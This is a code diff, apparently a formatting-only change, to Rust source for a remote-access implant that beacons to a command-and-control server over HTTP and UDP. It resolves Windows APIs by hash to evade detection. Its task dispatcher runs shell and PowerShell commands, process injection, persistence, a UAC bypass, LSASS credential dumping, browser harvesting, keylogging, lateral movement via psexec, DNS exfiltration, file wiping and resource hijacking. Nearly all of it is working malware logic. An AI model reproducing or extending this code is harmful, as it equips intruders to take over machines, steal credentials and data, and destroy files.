@@ -143,8 +143,8 @@ pub struct HttpTransport {
 #[cfg(not(target_os = "windows"))]
 impl HttpTransport {
     pub fn new(config: &C2Config, port: u16) -> Self {
-        Self { 
-            host: config.server_addr, 
+        Self {
+            host: config.server_addr,
             port,
             user_agent: config.user_agent,
             uri: config.uri,
@@ -183,7 +183,11 @@ impl Transport for HttpTransport {
                 return Err(());
             }
 
-            let host_val = if !self.host_header.is_empty() { self.host_header } else { self.host };
+            let host_val = if !self.host_header.is_empty() {
+                self.host_header
+            } else {
+                self.host
+            };
 
             let req = format!(
                 "POST {} HTTP/1.1\r\n\
@@ -214,7 +218,11 @@ impl Transport for HttpTransport {
 
             let mut body_start = 0;
             for i in 0..resp_vec.len().saturating_sub(3) {
-                if resp_vec[i] == 13 && resp_vec[i + 1] == 10 && resp_vec[i + 2] == 13 && resp_vec[i + 3] == 10 {
+                if resp_vec[i] == 13
+                    && resp_vec[i + 1] == 10
+                    && resp_vec[i + 2] == 13
+                    && resp_vec[i + 3] == 10
+                {
                     body_start = i + 4;
                     break;
                 }
@@ -242,8 +250,8 @@ pub struct HttpTransport {
 #[cfg(target_os = "windows")]
 impl HttpTransport {
     pub fn new(config: &C2Config, port: u16) -> Self {
-        Self { 
-            host: config.server_addr, 
+        Self {
+            host: config.server_addr,
             port,
             user_agent: config.user_agent,
             uri: config.uri,
@@ -257,36 +265,92 @@ impl Transport for HttpTransport {
     fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
         let wininet_hash = hash_str(b"wininet.dll");
         unsafe {
-            type InternetOpenA = unsafe extern "system" fn(*const u8, u32, *const u8, *const u8, u32) -> HANDLE;
-            type InternetConnectA = unsafe extern "system" fn(HANDLE, *const u8, u16, *const u8, *const u8, u32, u32, u32) -> HANDLE;
-            type HttpOpenRequestA = unsafe extern "system" fn(HANDLE, *const u8, *const u8, *const u8, *const u8, *const *const u8, u32, u32) -> HANDLE;
-            type HttpSendRequestA = unsafe extern "system" fn(HANDLE, *const u8, u32, *const c_void, u32) -> i32;
+            type InternetOpenA =
+                unsafe extern "system" fn(*const u8, u32, *const u8, *const u8, u32) -> HANDLE;
+            type InternetConnectA = unsafe extern "system" fn(
+                HANDLE,
+                *const u8,
+                u16,
+                *const u8,
+                *const u8,
+                u32,
+                u32,
+                u32,
+            ) -> HANDLE;
+            type HttpOpenRequestA = unsafe extern "system" fn(
+                HANDLE,
+                *const u8,
+                *const u8,
+                *const u8,
+                *const u8,
+                *const *const u8,
+                u32,
+                u32,
+            ) -> HANDLE;
+            type HttpSendRequestA =
+                unsafe extern "system" fn(HANDLE, *const u8, u32, *const c_void, u32) -> i32;
             type InternetReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32) -> i32;
             type InternetCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
 
-            let internet_open: InternetOpenA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetOpenA")));
-            let internet_connect: InternetConnectA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetConnectA")));
-            let http_open: HttpOpenRequestA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"HttpOpenRequestA")));
-            let http_send: HttpSendRequestA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"HttpSendRequestA")));
-            let internet_read: InternetReadFile = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetReadFile")));
-            let internet_close: InternetCloseHandle = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetCloseHandle")));
+            let internet_open: InternetOpenA =
+                core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetOpenA")));
+            let internet_connect: InternetConnectA = core::mem::transmute(resolve_function(
+                wininet_hash,
+                hash_str(b"InternetConnectA"),
+            ));
+            let http_open: HttpOpenRequestA = core::mem::transmute(resolve_function(
+                wininet_hash,
+                hash_str(b"HttpOpenRequestA"),
+            ));
+            let http_send: HttpSendRequestA = core::mem::transmute(resolve_function(
+                wininet_hash,
+                hash_str(b"HttpSendRequestA"),
+            ));
+            let internet_read: InternetReadFile = core::mem::transmute(resolve_function(
+                wininet_hash,
+                hash_str(b"InternetReadFile"),
+            ));
+            let internet_close: InternetCloseHandle = core::mem::transmute(resolve_function(
+                wininet_hash,
+                hash_str(b"InternetCloseHandle"),
+            ));
 
             let mut ua_c = Vec::from(self.user_agent.as_bytes());
             ua_c.push(0);
             let h_inet = internet_open(ua_c.as_ptr(), 1, core::ptr::null(), core::ptr::null(), 0);
-            if h_inet.is_null() { return Err(()); }
+            if h_inet.is_null() {
+                return Err(());
+            }
 
             let mut host_c = Vec::from(self.host.as_bytes());
             host_c.push(0);
-            let h_conn = internet_connect(h_inet, host_c.as_ptr(), self.port, core::ptr::null(), core::ptr::null(), 3, 0, 0);
-            if h_conn.is_null() { 
+            let h_conn = internet_connect(
+                h_inet,
+                host_c.as_ptr(),
+                self.port,
+                core::ptr::null(),
+                core::ptr::null(),
+                3,
+                0,
+                0,
+            );
+            if h_conn.is_null() {
                 internet_close(h_inet);
-                return Err(()); 
+                return Err(());
             }
 
             let mut uri_c = Vec::from(self.uri.as_bytes());
             uri_c.push(0);
-            let h_req = http_open(h_conn, b"POST\0".as_ptr(), uri_c.as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0, 0);
+            let h_req = http_open(
+                h_conn,
+                b"POST\0".as_ptr(),
+                uri_c.as_ptr(),
+                core::ptr::null(),
+                core::ptr::null(),
+                core::ptr::null(),
+                0,
+                0,
+            );
             if h_req.is_null() {
                 internet_close(h_conn);
                 internet_close(h_inet);
@@ -305,9 +369,20 @@ impl Transport for HttpTransport {
                 Vec::new()
             };
 
-            let headers_ptr = if !headers_c.is_empty() { headers_c.as_ptr() } else { core::ptr::null() };
+            let headers_ptr = if !headers_c.is_empty() {
+                headers_c.as_ptr()
+            } else {
+                core::ptr::null()
+            };
 
-            if http_send(h_req, headers_ptr, headers_c.len() as u32, data.as_ptr() as *const c_void, data.len() as u32) == 0 {
+            if http_send(
+                h_req,
+                headers_ptr,
+                headers_c.len() as u32,
+                data.as_ptr() as *const c_void,
+                data.len() as u32,
+            ) == 0
+            {
                 internet_close(h_req);
                 internet_close(h_conn);
                 internet_close(h_inet);
@@ -318,7 +393,9 @@ impl Transport for HttpTransport {
             let mut buf = [0u8; 4096];
             let mut bytes_read = 0;
             loop {
-                if internet_read(h_req, buf.as_mut_ptr() as PVOID, 4096, &mut bytes_read) == 0 || bytes_read == 0 {
+                if internet_read(h_req, buf.as_mut_ptr() as PVOID, 4096, &mut bytes_read) == 0
+                    || bytes_read == 0
+                {
                     break;
                 }
                 resp_vec.extend_from_slice(&buf[..bytes_read as usize]);
@@ -353,7 +430,9 @@ impl Transport for UdpTransport {
         unsafe {
             // UDP socket
             let sock = sys_socket(2, 2, 0); // AF_INET, SOCK_DGRAM
-            if (sock as isize) < 0 { return Err(()); }
+            if (sock as isize) < 0 {
+                return Err(());
+            }
 
             let mut ip_bytes = [0u8; 4];
             let mut parts = self.host.split('.');
@@ -369,17 +448,36 @@ impl Transport for UdpTransport {
                 sin_zero: [0; 8],
             };
 
-            let sent = sys_sendto(sock, data.as_ptr(), data.len(), 0, &addr as *const _ as *const u8, 16);
+            let sent = sys_sendto(
+                sock,
+                data.as_ptr(),
+                data.len(),
+                0,
+                &addr as *const _ as *const u8,
+                16,
+            );
             if sent < 0 {
                 sys_close(sock);
                 return Err(());
             }
 
             let mut buf = [0u8; 4096];
-            let mut src_addr = SockAddrIn { sin_family: 0, sin_port: 0, sin_addr: 0, sin_zero: [0; 8] };
+            let mut src_addr = SockAddrIn {
+                sin_family: 0,
+                sin_port: 0,
+                sin_addr: 0,
+                sin_zero: [0; 8],
+            };
             let mut addr_len = 16u32;
-            
-            let n = sys_recvfrom(sock, buf.as_mut_ptr(), 4096, 0, &mut src_addr as *mut _ as *mut u8, &mut addr_len);
+
+            let n = sys_recvfrom(
+                sock,
+                buf.as_mut_ptr(),
+                4096,
+                0,
+                &mut src_addr as *mut _ as *mut u8,
+                &mut addr_len,
+            );
             sys_close(sock);
 
             if n > 0 {
@@ -411,18 +509,22 @@ impl Transport for UdpTransport {
             // 1. Load ws2_32.dll
             let k32_hash = hash_str(b"kernel32.dll");
             let load_lib_addr = resolve_function(k32_hash, hash_str(b"LoadLibraryA"));
-            if load_lib_addr.is_null() { return Err(()); }
+            if load_lib_addr.is_null() {
+                return Err(());
+            }
             type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
             let load_library: FnLoadLibraryA = core::mem::transmute(load_lib_addr);
-            
+
             let h_mod = load_library(b"ws2_32.dll\0".as_ptr());
-            if h_mod.is_null() { return Err(()); }
+            if h_mod.is_null() {
+                return Err(());
+            }
 
             // 2. Resolve functions
             // Note: In a real implant, we might cache these or resolving from the loaded module handle directly
             // `resolve_function` uses PEB walking which finds loaded modules. Since we just loaded it, it should be in PEB.
             let ws2_hash = hash_str(b"ws2_32.dll");
-            
+
             let wsa_startup_addr = resolve_function(ws2_hash, hash_str(b"WSAStartup"));
             let socket_addr = resolve_function(ws2_hash, hash_str(b"socket"));
             let sendto_addr = resolve_function(ws2_hash, hash_str(b"sendto"));
@@ -430,15 +532,21 @@ impl Transport for UdpTransport {
             let closesocket_addr = resolve_function(ws2_hash, hash_str(b"closesocket"));
             let htobe16_addr = resolve_function(ws2_hash, hash_str(b"htons")); // htons is same as htobe16
 
-            if wsa_startup_addr.is_null() || socket_addr.is_null() || sendto_addr.is_null() 
-               || recvfrom_addr.is_null() || closesocket_addr.is_null() {
+            if wsa_startup_addr.is_null()
+                || socket_addr.is_null()
+                || sendto_addr.is_null()
+                || recvfrom_addr.is_null()
+                || closesocket_addr.is_null()
+            {
                 return Err(());
             }
 
             type FnWSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
             type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> usize;
-            type FnSendTo = unsafe extern "system" fn(usize, *const u8, i32, i32, *const u8, i32) -> i32;
-            type FnRecvFrom = unsafe extern "system" fn(usize, *mut u8, i32, i32, *mut u8, *mut i32) -> i32;
+            type FnSendTo =
+                unsafe extern "system" fn(usize, *const u8, i32, i32, *const u8, i32) -> i32;
+            type FnRecvFrom =
+                unsafe extern "system" fn(usize, *mut u8, i32, i32, *mut u8, *mut i32) -> i32;
             type FnCloseSocket = unsafe extern "system" fn(usize) -> i32;
             type FnHtons = unsafe extern "system" fn(u16) -> u16;
 
@@ -448,10 +556,10 @@ impl Transport for UdpTransport {
             let recvfrom_fn: FnRecvFrom = core::mem::transmute(recvfrom_addr);
             let closesocket_fn: FnCloseSocket = core::mem::transmute(closesocket_addr);
             let htons_fn: FnHtons = if !htobe16_addr.is_null() {
-                 core::mem::transmute(htobe16_addr)
+                core::mem::transmute(htobe16_addr)
             } else {
-                 // Fallback if htons not found (unlikely), simple swap
-                 |x| x.to_be()
+                // Fallback if htons not found (unlikely), simple swap
+                |x| x.to_be()
             };
 
             // 3. Initialize Winsock
@@ -462,7 +570,8 @@ impl Transport for UdpTransport {
 
             // 4. Create Socket
             let sock = socket_fn(2, 2, 17); // AF_INET, SOCK_DGRAM, IPPROTO_UDP
-            if sock == !0usize { // INVALID_SOCKET
+            if sock == !0usize {
+                // INVALID_SOCKET
                 return Err(());
             }
 
@@ -498,8 +607,15 @@ impl Transport for UdpTransport {
             let mut src_addr = [0u8; 16];
             let mut addr_len = 16i32;
 
-            let n = recvfrom_fn(sock, buf.as_mut_ptr(), 4096, 0, src_addr.as_mut_ptr(), &mut addr_len);
-            
+            let n = recvfrom_fn(
+                sock,
+                buf.as_mut_ptr(),
+                4096,
+                0,
+                src_addr.as_mut_ptr(),
+                &mut addr_len,
+            );
+
             closesocket_fn(sock);
 
             if n > 0 {
@@ -538,7 +654,10 @@ fn perform_handshake(transport: &mut dyn Transport) -> Result<NoiseTransport, ()
     noise.into_transport(None, peer_ratchet_pub).map_err(|_| ())
 }
 
-fn perform_pq_exchange(session: &mut NoiseTransport, transport: &mut dyn Transport) -> Result<(), ()> {
+fn perform_pq_exchange(
+    session: &mut NoiseTransport,
+    transport: &mut dyn Transport,
+) -> Result<(), ()> {
     let mut rng = wraith_crypto::random::SecureRng::new();
     let (ek, dk) = wraith_crypto::pq::generate_keypair(&mut rng);
 
@@ -557,10 +676,11 @@ fn perform_pq_exchange(session: &mut NoiseTransport, transport: &mut dyn Transpo
     }
 
     // Parse Ciphertext
-    let ct = wraith_crypto::pq::ciphertext_from_bytes(resp_frame.payload.as_slice()).map_err(|_| ())?;
+    let ct =
+        wraith_crypto::pq::ciphertext_from_bytes(resp_frame.payload.as_slice()).map_err(|_| ())?;
 
     let ss = wraith_crypto::pq::decapsulate(&dk, &ct);
-    
+
     session.mix_key(&ss);
     Ok(())
 }
@@ -570,7 +690,10 @@ fn get_current_unix_time() -> u64 {
     unsafe {
         let k32 = hash_str(b"kernel32.dll");
         type GetSystemTimeAsFileTime = unsafe extern "system" fn(*mut u64);
-        let func = core::mem::transmute::<_, GetSystemTimeAsFileTime>(resolve_function(k32, hash_str(b"GetSystemTimeAsFileTime")));
+        let func = core::mem::transmute::<_, GetSystemTimeAsFileTime>(resolve_function(
+            k32,
+            hash_str(b"GetSystemTimeAsFileTime"),
+        ));
         let mut ft = 0u64;
         func(&mut ft);
         // FileTime is 100ns intervals since 1601-01-01
@@ -579,7 +702,10 @@ fn get_current_unix_time() -> u64 {
     }
     #[cfg(not(target_os = "windows"))]
     unsafe {
-        let mut tp = Timespec { tv_sec: 0, tv_nsec: 0 };
+        let mut tp = Timespec {
+            tv_sec: 0,
+            tv_nsec: 0,
+        };
         sys_clock_gettime(0, &mut tp); // CLOCK_REALTIME = 0
         tp.tv_sec as u64
     }
@@ -592,12 +718,16 @@ fn get_current_hour() -> u8 {
 }
 
 fn is_kill_date_reached(kill_date: u64) -> bool {
-    if kill_date == 0 { return false; }
+    if kill_date == 0 {
+        return false;
+    }
     get_current_unix_time() > kill_date
 }
 
 fn is_within_working_hours(start: u8, end: u8) -> bool {
-    if start == 0 && end == 0 { return true; } // 24/7
+    if start == 0 && end == 0 {
+        return true;
+    } // 24/7
     let hour = get_current_hour();
     if start < end {
         hour >= start && hour < end
@@ -607,21 +737,22 @@ fn is_within_working_hours(start: u8, end: u8) -> bool {
     }
 }
 
-pub fn run_beacon_loop(_initial_config: C2Config) -> !
-{
+pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
     let config = C2Config::get_global();
     let mut http_transport = HttpTransport::new(&config, 8080);
     let mut udp_transport = UdpTransport::new(config.server_addr, 9999);
-    
+
     let mut use_udp = matches!(config.transport, TransportType::Udp);
 
     let mut mesh_server = crate::modules::mesh::MeshServer::new();
     let _ = mesh_server.start_tcp(4444);
     let _ = mesh_server.start_pipe("wraith_mesh");
 
-    loop { // Outer loop: Re-handshake on failure
+    loop {
+        // Outer loop: Re-handshake on failure
         let mut session;
-        loop { // Handshake loop
+        loop {
+            // Handshake loop
             // Check KillDate
             if is_kill_date_reached(config.kill_date) {
                 unsafe { crate::utils::syscalls::sys_exit(0) };
@@ -633,8 +764,12 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
                 continue;
             }
 
-            let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
-            
+            let transport: &mut dyn Transport = if use_udp {
+                &mut udp_transport
+            } else {
+                &mut http_transport
+            };
+
             match perform_handshake(transport) {
                 Ok(mut s) => {
                     // Upgrade to Post-Quantum Hybrid
@@ -645,7 +780,7 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
                     // PQ Exchange failed, retry handshake
                     use_udp = !use_udp;
                     crate::utils::obfuscation::sleep(config.sleep_interval);
-                },
+                }
                 Err(_) => {
                     // Failover
                     use_udp = !use_udp;
@@ -659,7 +794,8 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
         let rekey_interval = 120_000 / config.sleep_interval.max(1000); // ~2 minutes
         let mut failures = 0;
 
-        loop { // Beacon loop
+        loop {
+            // Beacon loop
             // Check KillDate
             if is_kill_date_reached(config.kill_date) {
                 unsafe { crate::utils::syscalls::sys_exit(0) };
@@ -686,18 +822,22 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
                 // The actual new key is carried in the Double Ratchet header of this encrypted message
                 let rekey_frame = WraithFrame::new(packet::FRAME_REKEY_DH, Vec::new());
                 if let Ok(msg) = session.write_message(&rekey_frame.serialize()) {
-                     let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
-                     // We expect the server to respond (potentially with its own new key in the header)
-                     if let Ok(resp) = transport.request(&msg) {
-                         // Process response to advance ratchet
-                         if session.read_message(&resp).is_ok() {
-                             failures = 0;
-                         } else {
-                             failures += 1;
-                         }
-                     } else {
-                         failures += 1;
-                     }
+                    let transport: &mut dyn Transport = if use_udp {
+                        &mut udp_transport
+                    } else {
+                        &mut http_transport
+                    };
+                    // We expect the server to respond (potentially with its own new key in the header)
+                    if let Ok(resp) = transport.request(&msg) {
+                        // Process response to advance ratchet
+                        if session.read_message(&resp).is_ok() {
+                            failures = 0;
+                        } else {
+                            failures += 1;
+                        }
+                    } else {
+                        failures += 1;
+                    }
                 }
             }
 
@@ -706,7 +846,11 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
             for (data, client_idx) in mesh_data {
                 let mut relay_frame = WraithFrame::new(packet::FRAME_TYPE_MESH_RELAY, data);
                 relay_frame.stream_id = client_idx as u16;
-                let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
+                let transport: &mut dyn Transport = if use_udp {
+                    &mut udp_transport
+                } else {
+                    &mut http_transport
+                };
                 if let Ok(msg_to_send) = session.write_message(&relay_frame.serialize()) {
                     let _ = transport.request(&msg_to_send);
                 }
@@ -714,10 +858,10 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
 
             let hostname_sd = crate::modules::discovery::Discovery.get_hostname();
             let username_sd = crate::modules::discovery::Discovery.get_username();
-            
+
             let mut hostname_str = alloc::string::String::from("unknown");
             let mut username_str = alloc::string::String::from("unknown");
-            
+
             if let Some(guard) = hostname_sd.unlock() {
                 hostname_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
             }
@@ -725,15 +869,22 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
                 username_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
             }
 
-            let beacon_json = format!(r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#, hostname_str, username_str);
-            
+            let beacon_json = format!(
+                r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#,
+                hostname_str, username_str
+            );
+
             let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
             let frame_bytes = frame.serialize();
 
             if let Ok(msg_to_send) = session.write_message(&frame_bytes) {
                 packet_count += 1;
 
-                let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
+                let transport: &mut dyn Transport = if use_udp {
+                    &mut udp_transport
+                } else {
+                    &mut http_transport
+                };
                 if let Ok(resp) = transport.request(&msg_to_send) {
                     if let Ok(pt) = session.read_message(&resp) {
                         failures = 0; // Reset failures on success
@@ -749,12 +900,13 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
             }
 
             last_rekey += 1;
-            
+
             // Jittered Sleep
             let jitter_amt = if config.jitter > 0 {
                 let mut rand_buf = [0u8; 1];
                 crate::utils::entropy::get_random_bytes(&mut rand_buf);
-                let rand_percent = (rand_buf[0] as u64 % (config.jitter as u64 * 2)) as i64 - config.jitter as i64;
+                let rand_percent =
+                    (rand_buf[0] as u64 % (config.jitter as u64 * 2)) as i64 - config.jitter as i64;
                 config.sleep_interval as i64 * rand_percent / 100
             } else {
                 0
@@ -784,7 +936,7 @@ fn hex_decode(s: &str) -> Vec<u8> {
     let chars: Vec<char> = s.chars().collect();
     for i in (0..s.len()).step_by(2) {
         if i + 1 < s.len() {
-            let byte_str = format!("{}{}", chars[i], chars[i+1]);
+            let byte_str = format!("{}{}", chars[i], chars[i + 1]);
             if let Ok(byte) = u8::from_str_radix(&byte_str, 16) {
                 res.push(byte);
             }
@@ -798,7 +950,12 @@ use zeroize::Zeroize;
 
 // ...
 
-fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn Transport, mesh_server: &mut crate::modules::mesh::MeshServer) {
+fn dispatch_tasks(
+    data: &[u8],
+    session: &mut NoiseTransport,
+    transport: &mut dyn Transport,
+    mesh_server: &mut crate::modules::mesh::MeshServer,
+) {
     if let Some(frame) = WraithFrame::deserialize(data) {
         if frame.frame_type == packet::FRAME_TYPE_REKEY {
             // Double Ratchet handles rekeying automatically
@@ -827,10 +984,10 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                 "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
                 "shell" => {
                     result = Some(crate::modules::shell::Shell.exec(&task.payload));
-                },
+                }
                 "powershell" => {
                     result = Some(crate::modules::powershell::PowerShell.exec(&task.payload));
-                },
+                }
                 "inject" => {
                     let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                     if parts.len() == 3 {
@@ -843,10 +1000,14 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                         };
                         let payload = hex_decode(parts[2]);
                         let res = crate::modules::injection::Injector.inject(pid, &payload, method);
-                        let msg = if res.is_ok() { b"Injection successful" as &[u8] } else { b"Injection failed" as &[u8] };
+                        let msg = if res.is_ok() {
+                            b"Injection successful" as &[u8]
+                        } else {
+                            b"Injection failed" as &[u8]
+                        };
                         result = Some(SensitiveData::new(msg));
                     }
-                },
+                }
                 "bof" => {
                     let bof_data = hex_decode(&task.payload);
                     let mut res_vec;
@@ -866,19 +1027,23 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                     }
                     result = Some(SensitiveData::new(&res_vec));
                     res_vec.zeroize();
-                },
+                }
                 "socks" => {
                     let mut res_vec;
                     unsafe {
                         if (*core::ptr::addr_of!(SOCKS_PROXY)).is_none() {
-                            *core::ptr::addr_of_mut!(SOCKS_PROXY) = Some(crate::modules::socks::SocksProxy::new());
+                            *core::ptr::addr_of_mut!(SOCKS_PROXY) =
+                                Some(crate::modules::socks::SocksProxy::new());
                         }
                         let payload = hex_decode(&task.payload);
-                        res_vec = (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut().unwrap().process(&payload);
+                        res_vec = (*core::ptr::addr_of_mut!(SOCKS_PROXY))
+                            .as_mut()
+                            .unwrap()
+                            .process(&payload);
                     }
                     result = Some(SensitiveData::new(&res_vec));
                     res_vec.zeroize();
-                },
+                }
                 "persist" => {
                     let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                     if parts.len() == 3 {
@@ -886,46 +1051,62 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                         let name = parts[1];
                         let path = parts[2];
                         let res = match method {
-                            "registry" => crate::modules::persistence::Persistence.install_registry_run(name, path),
-                            "task" => crate::modules::persistence::Persistence.install_scheduled_task(name, path),
+                            "registry" => crate::modules::persistence::Persistence
+                                .install_registry_run(name, path),
+                            "task" => crate::modules::persistence::Persistence
+                                .install_scheduled_task(name, path),
                             _ => Err(()),
                         };
-                        let msg = if res.is_ok() { b"Persistence installed" as &[u8] } else { b"Persistence failed" as &[u8] };
+                        let msg = if res.is_ok() {
+                            b"Persistence installed" as &[u8]
+                        } else {
+                            b"Persistence failed" as &[u8]
+                        };
                         result = Some(SensitiveData::new(msg));
                     } else {
                         result = Some(SensitiveData::new(b"Invalid persist args"));
                     }
-                },
+                }
                 "uac_bypass" => {
                     let res = crate::modules::privesc::PrivEsc.fodhelper(&task.payload);
-                    let msg = if res.is_ok() { b"Exploit triggered" as &[u8] } else { b"Exploit failed" as &[u8] };
+                    let msg = if res.is_ok() {
+                        b"Exploit triggered" as &[u8]
+                    } else {
+                        b"Exploit failed" as &[u8]
+                    };
                     result = Some(SensitiveData::new(msg));
-                },
+                }
                 "timestomp" => {
                     let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                     if parts.len() == 2 {
                         let res = crate::modules::evasion::Evasion.timestomp(parts[0], parts[1]);
-                        let msg = if res.is_ok() { b"Timestomped" as &[u8] } else { b"Failed" as &[u8] };
+                        let msg = if res.is_ok() {
+                            b"Timestomped" as &[u8]
+                        } else {
+                            b"Failed" as &[u8]
+                        };
                         result = Some(SensitiveData::new(msg));
                     }
-                },
+                }
                 "sandbox_check" => {
                     let is_sandbox = crate::modules::evasion::Evasion.is_sandbox();
                     let s = format!("Is Sandbox: {}", is_sandbox);
                     let mut v = s.into_bytes();
                     result = Some(SensitiveData::new(&v));
                     v.zeroize();
-                },
+                }
                 "dump_lsass" => {
-                    if let Ok(sd) = crate::modules::credentials::Credentials.dump_lsass(&task.payload) {
+                    if let Ok(sd) =
+                        crate::modules::credentials::Credentials.dump_lsass(&task.payload)
+                    {
                         result = Some(sd);
                     } else {
                         result = Some(SensitiveData::new(b"Dump failed"));
                     }
-                },
+                }
                 "sys_info" => {
                     result = Some(crate::modules::discovery::Discovery.sys_info());
-                },
+                }
                 "screenshot" => {
                     let res = crate::modules::screenshot::Screenshot.capture();
                     let msg = match res {
@@ -933,7 +1114,7 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                         Err(_) => b"Screenshot failed".to_vec(),
                     };
                     result = Some(SensitiveData::new(&msg));
-                },
+                }
                 "browser" => {
                     let res = crate::modules::browser::Browser.harvest();
                     let msg = match res {
@@ -941,60 +1122,81 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                         Err(_) => b"Browser harvesting failed".to_vec(),
                     };
                     result = Some(SensitiveData::new(&msg));
-                },
+                }
                 "net_scan" => {
                     result = Some(crate::modules::discovery::Discovery.net_scan(&task.payload));
-                },
+                }
                 "psexec" => {
                     let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                     if parts.len() == 3 {
-                        let res = crate::modules::lateral::Lateral.psexec(parts[0], parts[1], parts[2]);
-                        let msg = if res.is_ok() { b"Service created" as &[u8] } else { b"Failed" as &[u8] };
+                        let res =
+                            crate::modules::lateral::Lateral.psexec(parts[0], parts[1], parts[2]);
+                        let msg = if res.is_ok() {
+                            b"Service created" as &[u8]
+                        } else {
+                            b"Failed" as &[u8]
+                        };
                         result = Some(SensitiveData::new(msg));
                     }
-                },
+                }
                 "service_stop" => {
                     let res = crate::modules::lateral::Lateral.service_stop(&task.payload);
-                    let msg = if res.is_ok() { b"Service stopped" as &[u8] } else { b"Failed" as &[u8] };
+                    let msg = if res.is_ok() {
+                        b"Service stopped" as &[u8]
+                    } else {
+                        b"Failed" as &[u8]
+                    };
                     result = Some(SensitiveData::new(msg));
-                },
+                }
                 "keylogger" => {
                     result = crate::modules::collection::Collection.keylogger_poll();
-                },
+                }
                 "mesh_relay" => {
                     let packet = hex_decode(&task.payload);
                     let mut res_vec = Vec::new();
-                    if let Some(proxy) = unsafe { (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut() } {
+                    if let Some(proxy) = unsafe { (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut() }
+                    {
                         res_vec = proxy.process(&packet);
                     }
                     result = Some(SensitiveData::new(&res_vec));
                     res_vec.zeroize();
-                },
+                }
                 "compress" => {
                     let data = hex_decode(&task.payload);
                     let compressed = crate::modules::compression::Compression.compress(&data);
                     result = Some(SensitiveData::new(&compressed));
-                },
+                }
                 "exfil_dns" => {
                     let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                     if parts.len() == 2 {
                         let data = hex_decode(parts[0]);
                         let domain = parts[1];
-                        let res = crate::modules::exfiltration::Exfiltration.exfiltrate_dns(&data, domain);
-                        let msg = if res.is_ok() { b"Exfiltration started" as &[u8] } else { b"Exfiltration failed" as &[u8] };
+                        let res = crate::modules::exfiltration::Exfiltration
+                            .exfiltrate_dns(&data, domain);
+                        let msg = if res.is_ok() {
+                            b"Exfiltration started" as &[u8]
+                        } else {
+                            b"Exfiltration failed" as &[u8]
+                        };
                         result = Some(SensitiveData::new(msg));
                     }
-                },
+                }
                 "wipe" => {
                     let res = crate::modules::impact::Impact.wipe_file(&task.payload);
-                    let msg = if res.is_ok() { b"File wiped" as &[u8] } else { b"Wipe failed" as &[u8] };
+                    let msg = if res.is_ok() {
+                        b"File wiped" as &[u8]
+                    } else {
+                        b"Wipe failed" as &[u8]
+                    };
                     result = Some(SensitiveData::new(msg));
-                },
+                }
                 "hijack" => {
                     let duration = task.payload.parse::<u32>().unwrap_or(1000);
                     crate::modules::impact::Impact.hijack_resources(duration);
-                    result = Some(SensitiveData::new(b"Resource hijacking simulation complete"));
-                },
+                    result = Some(SensitiveData::new(
+                        b"Resource hijacking simulation complete",
+                    ));
+                }
                 _ => {}
             }
 
